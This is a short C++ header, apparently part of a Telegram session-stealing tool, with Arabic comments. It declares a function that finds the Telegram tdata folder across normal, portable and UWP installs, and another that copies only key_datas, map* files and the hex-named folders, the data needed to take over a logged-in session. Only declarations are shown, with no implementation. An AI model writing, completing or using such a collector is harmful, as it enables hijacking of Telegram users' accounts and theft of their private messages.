// telegram_collector.h
#pragma once
#include <string>

// يبحث عن مسار tdata الحقيقي (تيليجرام عادي، محمول، أو UWP)
std::string FindTelegramTdata();

// ينسخ المجلد tdata بشكل ذكي (فقط key_datas, map*, والمجلدات السداسية)
bool CopyTelegramSession(const std::string& tdataPath, const std::string& outputDir);